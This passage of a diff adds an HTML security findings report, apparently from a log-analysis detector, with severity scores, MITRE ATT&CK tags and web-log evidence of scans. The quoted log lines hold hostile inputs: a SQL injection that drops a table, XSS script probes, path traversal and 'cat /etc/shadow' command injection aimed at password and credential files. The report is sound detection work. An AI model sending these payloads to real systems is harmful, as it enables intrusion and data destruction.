+        </a>
+        <div id="ev-10" class="evidence-block" style="display:none">
+          <code>198.51.100.23 - - [14/Oct/2024:09:00:12 +0000] &quot;GET /api/v1/users?id=1; DROP TABLE users-- HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="critical">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fca5a5;color:#7f1d1d">🔴 CRITICAL</span>
+    <strong style="flex:1">Xss Attempt</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 90/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:90%;background:#ef4444"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">Cross-Site Scripting (XSS) attempt detected (21 events) [Corroborated by 2 detectors — score boosted]</p>
+    <div class="meta-row"><span>📡 45.33.32.156</span><span>🕐 2024-10-14 08:03:44</span><span>📊 21 event(s)</span><span>🔧 Pattern Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1190/" target="_blank" class="mitre" title="Initial Access">T1190 Exploit Public-Facing Application</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-11'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 5 evidence line(s)
+        </a>
+        <div id="ev-11" class="evidence-block" style="display:none">
+          <code>45.33.32.156 - - [14/Oct/2024:08:03:44 +0000] &quot;GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:07:44 +0000] &quot;GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:06:32 +0000] &quot;GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:09:20 +0000] &quot;GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:06:56 +0000] &quot;GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="critical">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fca5a5;color:#7f1d1d">🔴 CRITICAL</span>
+    <strong style="flex:1">Sensitive File Access</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 90/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:90%;background:#ef4444"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">Attempt to access sensitive file or configuration (4 events) [Corroborated by 3 detectors — score boosted]</p>
+    <div class="meta-row"><span>📡 198.51.100.23</span><span>🕐 2024-10-14 09:00:08</span><span>📊 4 event(s)</span><span>🔧 Pattern Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1552/001/" target="_blank" class="mitre" title="Credential Access">T1552.001 Credentials In Files</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-12'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 4 evidence line(s)
+        </a>
+        <div id="ev-12" class="evidence-block" style="display:none">
+          <code>198.51.100.23 - - [14/Oct/2024:09:00:08 +0000] &quot;GET /.env HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:00:20 +0000] &quot;GET /.git/config HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:00:04 +0000] &quot;GET /../../etc/passwd HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:00:14 +0000] &quot;GET /?cmd=cat /etc/shadow HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="critical">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fca5a5;color:#7f1d1d">🔴 CRITICAL</span>
+    <strong style="flex:1">Error Rate Spike</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 86/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:86%;background:#ef4444"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">86% error rate in window 2024-10-14 09:00 (80/93 requests). May indicate scanning, attack, or application failure.</p>
+    <div class="meta-row"><span>🕐 2024-10-14 09:03:17</span><span>📊 93 event(s)</span><span>🔧 Statistical Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1595/" target="_blank" class="mitre" title="Reconnaissance">T1595 Active Scanning</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-13'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 5 evidence line(s)
+        </a>
+        <div id="ev-13" class="evidence-block" style="display:none">
+          <code>192.168.1.17 - - [14/Oct/2024:09:03:17 +0000] &quot;DELETE /products HTTP/1.1&quot; 200 14673 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot;
+</code><code>192.168.1.46 - - [14/Oct/2024:09:04:38 +0000] &quot;GET / HTTP/1.1&quot; 304 462 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:01:36 +0000] &quot;GET /20 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:02:00 +0000] &quot;GET /32 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:01:20 +0000] &quot;GET /12 HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="critical">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fca5a5;color:#7f1d1d">🔴 CRITICAL</span>
+    <strong style="flex:1">Path Traversal</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 85/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:85%;background:#ef4444"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">Path traversal / directory traversal attempt (1 event) [Corroborated by 3 detectors — score boosted]</p>
+    <div class="meta-row"><span>📡 198.51.100.23</span><span>🕐 2024-10-14 09:00:04</span><span>📊 1 event(s)</span><span>🔧 Pattern Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1083/" target="_blank" class="mitre" title="Discovery">T1083 File and Directory Discovery</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-14'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 1 evidence line(s)
+        </a>
+        <div id="ev-14" class="evidence-block" style="display:none">
+          <code>198.51.100.23 - - [14/Oct/2024:09:00:04 +0000] &quot;GET /../../etc/passwd HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="high">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fcd34d;color:#78350f">🟠 HIGH</span>
+    <strong style="flex:1">Xss Attempt</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 75/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:75%;background:#f97316"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">Cross-Site Scripting (XSS) attempt detected (1 event) [Corroborated by 3 detectors — score boosted]</p>
+    <div class="meta-row"><span>📡 198.51.100.23</span><span>🕐 2024-10-14 09:00:02</span><span>📊 1 event(s)</span><span>🔧 Pattern Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1190/" target="_blank" class="mitre" title="Initial Access">T1190 Exploit Public-Facing Application</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-15'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 1 evidence line(s)
+        </a>
+        <div id="ev-15" class="evidence-block" style="display:none">
+          <code>198.51.100.23 - - [14/Oct/2024:09:00:02 +0000] &quot;GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="high">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fcd34d;color:#78350f">🟠 HIGH</span>
+    <strong style="flex:1">Web Path Enumeration</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 70/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:70%;background:#f97316"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">Web path enumeration / admin panel discovery attempt (7 events) [Corroborated by 3 detectors — score boosted]</p>
+    <div class="meta-row"><span>📡 198.51.100.23</span><span>🕐 2024-10-14 09:00:24</span><span>📊 7 event(s)</span><span>🔧 Pattern Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1595/003/" target="_blank" class="mitre" title="Reconnaissance">T1595.003 Wordlist Scanning</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-16'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 5 evidence line(s)
+        </a>
+        <div id="ev-16" class="evidence-block" style="display:none">
+          <code>198.51.100.23 - - [14/Oct/2024:09:00:24 +0000] &quot;GET /xmlrpc.php HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:00:20 +0000] &quot;GET /.git/config HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:00:06 +0000] &quot;GET /admin/login.php HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:00:22 +0000] &quot;GET /backup.sql HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code><code>198.51.100.23 - - [14/Oct/2024:09:00:16 +0000] &quot;GET /phpmyadmin/ HTTP/1.1&quot; 404 217 &quot;-&quot; &quot;Nikto/2.1.6&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="high">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fcd34d;color:#78350f">🟠 HIGH</span>
+    <strong style="flex:1">Web Path Enumeration</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 60/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:60%;background:#f97316"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">Web path enumeration / admin panel discovery attempt (13 events) [Corroborated by 2 detectors — score boosted]</p>
+    <div class="meta-row"><span>📡 45.33.32.156</span><span>🕐 2024-10-14 08:00:00</span><span>📊 13 event(s)</span><span>🔧 Pattern Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1595/003/" target="_blank" class="mitre" title="Reconnaissance">T1595.003 Wordlist Scanning</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-17'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 5 evidence line(s)
+        </a>
+        <div id="ev-17" class="evidence-block" style="display:none">
+          <code>45.33.32.156 - - [14/Oct/2024:08:00:00 +0000] &quot;GET /admin/login.php HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:07:28 +0000] &quot;GET /admin/login.php HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:05:36 +0000] &quot;GET /admin/login.php HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:08:48 +0000] &quot;GET /admin/login.php HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code><code>45.33.32.156 - - [14/Oct/2024:08:01:20 +0000] &quot;GET /admin/login.php HTTP/1.1&quot; 200 1024 &quot;-&quot; &quot;sqlmap/1.7.8#stable (https://sqlmap.org)&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="high">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#fcd34d;color:#78350f">🟠 HIGH</span>
+    <strong style="flex:1">Ml Behavioural Anomaly</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 56/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:56%;background:#f97316"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">ML anomaly detected for source 192.168.1.17 (anomaly score: 56/100).</p>
+    <div class="meta-row"><span>📡 192.168.1.17</span><span>🕐 2024-10-14 09:03:17</span><span>📊 51 event(s)</span><span>🔧 ML Detector (Isolation Forest)</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1595/" target="_blank" class="mitre" title="Reconnaissance">T1595 Active Scanning</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-18'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 5 evidence line(s)
+        </a>
+        <div id="ev-18" class="evidence-block" style="display:none">
+          <code>192.168.1.17 - - [14/Oct/2024:09:03:17 +0000] &quot;DELETE /products HTTP/1.1&quot; 200 14673 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot;
+</code><code>192.168.1.17 - - [14/Oct/2024:16:55:37 +0000] &quot;GET /api/v1/products HTTP/1.1&quot; 200 10406 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15&quot;
+</code><code>192.168.1.17 - - [14/Oct/2024:17:26:59 +0000] &quot;GET /index.html HTTP/1.1&quot; 200 2538 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;
+</code><code>192.168.1.17 - - [14/Oct/2024:10:49:21 +0000] &quot;POST /blog HTTP/1.1&quot; 200 6926 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15&quot;
+</code><code>192.168.1.17 - - [14/Oct/2024:07:43:18 +0000] &quot;POST /blog/post-1 HTTP/1.1&quot; 200 39267 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;
+</code>
+        </div>
+  </div>
+</div>
+<div class="finding-card" data-severity="medium">
+  <div class="finding-header">
+    <span class="severity-badge" style="background:#93c5fd;color:#1e3a5f">🟡 MEDIUM</span>
+    <strong style="flex:1">Web Path Enumeration</strong>
+    <span style="color:var(--text2);font-size:0.85rem">Score: 40/100</span>
+  </div>
+  <div class="finding-body">
+    <div class="score-bar-wrap"><div class="score-bar" style="width:40%;background:#3b82f6"></div></div>
+    <p class="finding-desc" style="margin-top:0.75rem">Web path enumeration / admin panel discovery attempt (1 event)</p>
+    <div class="meta-row"><span>📡 10.0.0.5</span><span>👤 admin</span><span>🕐 2024-10-15 03:17:00</span><span>📊 1 event(s)</span><span>🔧 Pattern Detector</span></div>
+    <div class="tags"><a href="https://attack.mitre.org/techniques/T1595/003/" target="_blank" class="mitre" title="Reconnaissance">T1595.003 Wordlist Scanning</a></div>
+    
+        <a href="#" onclick="toggleEvidence('ev-19'); return false;"
+           style="font-size:0.8rem; color:var(--accent)">
+          Show/hide 1 evidence line(s)
+        </a>
+        <div id="ev-19" class="evidence-block" style="display:none">
+          <code>10.0.0.5 - admin [15/Oct/2024:03:17:00 +0000] &quot;POST /admin/users/delete HTTP/1.1&quot; 200 250 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot;
+</code>
+        </div>
+  </div>
+</div>
+</div>
+
+<script>
+function filterFindings(severity) {
+  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+  event.target.classList.add('active');
+  document.querySelectorAll('.finding-card').forEach(card => {
+    card.style.display = (severity === 'all' || card.dataset.severity === severity) ? '' : 'none';
+  });
+}
+function toggleEvidence(id) {
+  const el = document.getElementById(id);
+  el.style.display = el.style.display === 'none' ? '' : 'none';
+}
+</script>
+</body>
+</html>
